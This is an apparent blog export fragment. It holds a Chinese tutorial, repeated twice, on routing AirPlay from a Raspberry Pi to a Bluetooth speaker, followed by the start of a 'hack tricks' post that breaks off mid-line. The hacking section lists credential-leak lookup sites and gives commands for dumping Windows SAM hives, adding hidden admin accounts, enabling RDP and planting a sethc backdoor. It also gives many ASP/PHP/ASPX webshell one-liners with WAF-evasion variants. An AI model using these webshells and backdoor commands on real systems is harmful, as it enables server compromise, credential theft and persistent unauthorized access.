title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\" target=\"_blank\" rel=\"external\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\" target=\"_blank\" rel=\"external\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\" target=\"_blank\" rel=\"external\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\" target=\"_blank\" rel=\"external\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\" target=\"_blank\" rel=\"external\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>\n","excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近买了小米蓝牙音响，使用一段时间后发现小米蓝牙音箱有一个极其不方便的地方就是家里苹果设备比较多，想切换设备播放的时候就比较麻烦，还要断开操作。<br>于是萌生了一个想法，正好手上有个树莓派，能不能这样：</p>\n<blockquote>\n<p>iOS设备-&gt;Airplay-&gt;树莓派-&gt;蓝牙-&gt;小米蓝牙音箱<br>","more":"<br><img src=\"/content/images/2016/08/DSC07326-5.JPG\" alt=\"\"></p>\n</blockquote>\n<p>因此这个问题可以分为两个部分：</p>\n<ul>\n<li>1.树莓派蓝牙音频配置部分</li>\n<li>2.树莓派Airplay播放部分</li>\n</ul>\n<p>在解决这个问题的时候，我走了不少弯路，错路，目前网上没有完整的这个问题的解决方案，此文目的正是填补网络空白。</p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3</li>\n<li>小米蓝牙音箱</li>\n<li>iOS设备</li>\n</ul>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><h2 id=\"树莓派安装Shairport-Sync\"><a href=\"#树莓派安装Shairport-Sync\" class=\"headerlink\" title=\"树莓派安装Shairport Sync\"></a>树莓派安装Shairport Sync</h2><p>Shairport Sync实际上是Shairport的修改版，负责让树莓派发射出稳定的Airplay，之前我一直在使用Shairport，偶然间发现这个神器，让Shairport更加稳定好用，而且加入到系统进程，开机即打开Airplay。<br>安装前请确认是否安装以下依赖包：</p>\n<ul>\n<li><code>apt-get install build-essential git</code></li>\n<li><code>apt-get install autoconf automake libtool libdaemon-dev libasound2-dev libpopt-dev libconfig-dev</code></li>\n<li><code>apt-get install avahi-daemon libavahi-client-dev</code> </li>\n<li><code>apt-get install libssl-dev</code> </li>\n<li><code>apt-get install libpolarssl-dev</code> </li>\n<li><code>apt-get install libsoxr-dev</code> </li>\n</ul>\n<p>随后下载Shairport Sync：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/mikebrady/shairport-sync.git</div></pre></td></tr></table></figure></p>\n<p>然后<code>cd</code>到相应目录，执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">autoreconf -i <span class=\"_\">-f</span></div></pre></td></tr></table></figure></p>\n<p>随后执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./configure --with-alsa --with-avahi --with-ssl=openssl --with-metadata --with-soxr --with-systemd</div></pre></td></tr></table></figure></p>\n<p>如果没问题的话，可以make了，此时该去洗手间去洗手间，该睡觉睡觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">make</div></pre></td></tr></table></figure></p>\n<p>创建开机启动：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">getent group shairport-sync &amp;&gt;/dev/null || sudo groupadd -r shairport-sync &gt;/dev/null</div><div class=\"line\"></div><div class=\"line\">getent passwd shairport-sync &amp;&gt; /dev/null || sudo useradd -r -M -g shairport-sync <span class=\"_\">-s</span> /usr/bin/nologin -G audio shairport-sync &gt;/dev/null</div></pre></td></tr></table></figure></p>\n<p>然后运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>最后输入，完成安装：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo update-rc.d shairport-sync defaults 90 10</div></pre></td></tr></table></figure></p>\n<h2 id=\"树莓派安装蓝牙\"><a href=\"#树莓派安装蓝牙\" class=\"headerlink\" title=\"树莓派安装蓝牙\"></a>树莓派安装蓝牙</h2><p>打开终端，用普通用户权限执行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get updgrade -y</div><div class=\"line\">sudo apt-get dist-upgrade -y</div></pre></td></tr></table></figure></p>\n<p>随后安装蓝牙及管理软件<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pi-bluetooth bluez bluez-firmware blueman</div></pre></td></tr></table></figure></p>\n<p>将pi用户添加到蓝牙组<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo usermod -G bluetooth <span class=\"_\">-a</span> pi</div></pre></td></tr></table></figure></p>\n<p>还有很<strong>重要</strong>的一条，安装蓝牙音频配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install pulseaudio pulseaudio-module-bluetooth</div></pre></td></tr></table></figure></p>\n<p>随后重启一次树莓派，开机，在图形化界面中配对蓝牙，操作比较简单，记得在配对成功后对设备进行连接，省略。<br>也可通过bluetoothctl或hictool命令进行配对。<br>随后记下蓝牙设备的地址，XX:XX:XX:XX:XX:XX格式。</p>\n<p><strong>在此步，务必通过测试音频是否能够正常与蓝牙设备通信，记得软件中要勾选蓝牙设备，否则将从3.5mm端口输出音频。推荐使用vlc播放器。</strong></p>\n<h2 id=\"配置蓝牙音频及Shariport-Sync\"><a href=\"#配置蓝牙音频及Shariport-Sync\" class=\"headerlink\" title=\"配置蓝牙音频及Shariport Sync\"></a>配置蓝牙音频及Shariport Sync</h2><p>安装依赖包：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install libdbus-1-dev</div><div class=\"line\">sudo apt-get install libglib2.0-dev</div><div class=\"line\">apt-cache search libasound</div><div class=\"line\">sudo apt-get install libasound2-dev</div></pre></td></tr></table></figure></p>\n<p>配置及重新安装最新版bluez，此刻可以去洗手间和睡觉觉：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://www.kernel.org/pub/linux/bluetooth/bluez-4.101.tar.xz</div><div class=\"line\">tar -xvf bluez-4.101.tar.xz</div><div class=\"line\"><span class=\"built_in\">cd</span> bluez-4.101</div><div class=\"line\">./configure --prefix=/usr --mandir=/usr/share/man --sysconfdir=/etc --localstatedir=/var --libexecdir=/lib</div><div class=\"line\">make</div><div class=\"line\">sudo make install</div></pre></td></tr></table></figure></p>\n<p>复制配置文件到目录：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/simple-agent /usr/bin/bluez-simple-agent</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-device /usr/bin/bluez-test-device</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/<span class=\"built_in\">test</span>/<span class=\"built_in\">test</span>-audio /usr/bin/bluez-test-audio</div><div class=\"line\">sudo cp /home/pi/bluez-4.101/audio/audio.conf /etc/bluetooth/</div></pre></td></tr></table></figure></p>\n<p>接着运行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get install python-dbus</div><div class=\"line\">sudo apt-get install python-gobject</div><div class=\"line\">sudo cp /usr/lib/alsa-lib/libasound_module_pcm_bluetooth.so /usr/lib/arm-linux-gnueabihf/alsa-lib/</div></pre></td></tr></table></figure></p>\n<p>编辑audio.conf文件使shariport的音频从蓝牙设备输出：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/bluetooth/audio.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 在[General]区域添加:</span></div><div class=\"line\">Enable=Sink,Socket</div><div class=\"line\"><span class=\"comment\"># 取消[A2DP]注释，并加入:</span></div><div class=\"line\">Maxconnections=4</div></pre></td></tr></table></figure>\n<p>打开蓝牙自启动:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> bluetooth</div></pre></td></tr></table></figure></p>\n<p>重启设备后，继续配置，打开asund.conf文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/asound.conf</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div></pre></td><td class=\"code\"><pre><div class=\"line\">pcm.bt_canz &#123;</div><div class=\"line\">type plug</div><div class=\"line\">slave &#123;</div><div class=\"line\">pcm &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">device XX:XX:XX:XX:XX:XX</div><div class=\"line\">profile <span class=\"string\">\"auto\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">hint &#123;</div><div class=\"line\">show on</div><div class=\"line\">description <span class=\"string\">\"Mi Speaker\"</span></div><div class=\"line\">&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">ctl.bt_canz &#123;</div><div class=\"line\">type bluetooth</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>测试bluez能否使用：<code>sudo bluez-simple-agent</code>，如果正常，按ctrl+c停止。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo bluez-simple-agent hci0 XX:XX:XX:XX:XX:XX</div><div class=\"line\">sudo bluez-test-audio connect XX:XX:XX:XX:XX:XX</div></pre></td></tr></table></figure></p>\n<p>测试是否连通：<code>speaker-test -c 2 -D bt_canz</code></p>\n<p>再次重启设备。<br>开启后编辑<code>/etc/shairport-sync.conf</code>：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo nano /etc/shairport-sync.conf</div><div class=\"line\"><span class=\"comment\">#去掉下面的注释，并加入bt_canz</span></div><div class=\"line\">output_device = bt_canz</div></pre></td></tr></table></figure></p>\n<p>保存！重启！开机即可用。<br><img src=\"/content/images/2016/08/IMG_0635.PNG\" alt=\"\"></p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://github.com/mikebrady/shairport-sync/issues/200\">https://github.com/mikebrady/shairport-sync/issues/200</a><br><a href=\"https://github.com/mikebrady/shairport-sync\">https://github.com/mikebrady/shairport-sync</a><br><a href=\"http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html\">http://shumeipai.nxez.com/2014/12/10/raspberry-pi-using-airplay-wireless-audio-playback-achieve-even-putting-wifi.html</a><br><a href=\"http://wangye.org/blog/archives/921/\">http://wangye.org/blog/archives/921/</a><br><a href=\"http://blog.csdn.net/huayucong/article/details/51376461\">http://blog.csdn.net/huayucong/article/details/51376461</a><br><a href=\"http://blog.csdn.net/zhaoqi_0612/article/details/47731821\">http://blog.csdn.net/zhaoqi_0612/article/details/47731821</a><br><a href=\"http://blog.csdn.net/techtitan/article/details/6165116\">http://blog.csdn.net/techtitan/article/details/6165116</a><br><a href=\"http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1\">http://www.eeboard.com/bbs/forum.php?mod=viewthread&amp;tid=45040&amp;page=1</a></p>"},{"title":"那些Hack神器及奇技淫巧","date":"2016-09-11T22:07:28.000Z","_content":"# 简介\n这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。\n\n# 那些网站\n## 社工库\n\n### 国内\n\nhttp://www.findmima.com/\n\nhttp://www.wghostk.com/so/\n\nhttp://p.08lt.com\n\nhttp://www.144118.com/\n\n### 国际\n\nhttps://haveibeenpwned.com/\n\nhttps://leakbase.pw/\n\n## C段\nhttp://www.144118.com/\n\n## whois查询\nhttp://whois.domaintools.com/\n\n## 历史页面\n\n# 那些实用命令\n## reg导出sam\nreg save hklm\\sam sam.hive\n\nreg save hklm\\system system.hive\n\nreg save hklm\\security security.hive\n\n## Windows新建用户\nnet user admin$ admin /add\n\nnet localgroup administrators admin$ /add\n\nnet user Guest 1234\n\nnet user Guest /active:yes\n\nnet localgroup administrators Guest /add\n\n## 打开3389(2003,xp)\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n## sethc后门\nCopy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y\n\n## mssql xpcmdshell报错\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n\n# 那些一句话\n\n## asp一句话木马\n```\n<%eval request(\"x\")%>\n```\n\n## php一句话木马\n```\n<?php eval($_POST[g]);?>\n```\n\n## aspx一句话\n```\n<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"x\"],\"unsafe\");%>\n```\n\n## 数据库加密一句话(密码a)\n```\n┼攠數畣整爠煥敵瑳∨≡┩愾\n```\n\n## 网站配置、版权信息专用一句话\n```\n\"%><%Eval Request(x)%>\n```\n\n## 一句话再过护卫神\n```\n<%Y=request(\"x\")%> <%execute(Y)%>\n```\n\n## 过拦截一句话木马\n```\n<% eXEcGlOBaL ReQuEsT(\"x\") %>\n```\n\n## asp闭合型一句话 \n```\n%><%eval request(\"0o1Znz1ow\")%><%\n```\n\n## 能过安全狗的解析格式\n```\n;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg\n```\n\n## 突破安全狗的一句话\n```\n<%Y=request(\"x\")%> <%eval(Y)%>\n```\n\n## elong过安全狗的php一句话\n```\n<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>\n```\n\n## 后台常用写入php一句话（密码x）\n```\n<? \n $fp = @fopen(\"c.php\", 'a'); \n @fwrite($fp, '<'.'?php'.\"\\r\\n\\r\\n\".'eval($_POST[x])'.\"\\r\\n\\r\\n?\".\">\\r\\n\"); \n @fclose($fp); \n ?>\n```\n \n## 高强度php一句话\n```\n<?php substr(md5($_REQUEST['heroes']),28)=='acd0'&&eval($_REQUEST['c']);?>\n```\n\n## 新型变异PHP一句话(密码b4dboy)\n```\n($b4dboy = $_POST['b4dboy']) && @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);\n```\n\n## 突破安全狗的aspx一句话\n```\n<%@ Page Language=\"C#\" ValidateRequest=\"false\" %>\n<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[\"你的密码\"].Value))).CreateInstance(\"c\", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>\n```\n\n## 突破护卫神，保护盾一句话\n```\n<?php $a = 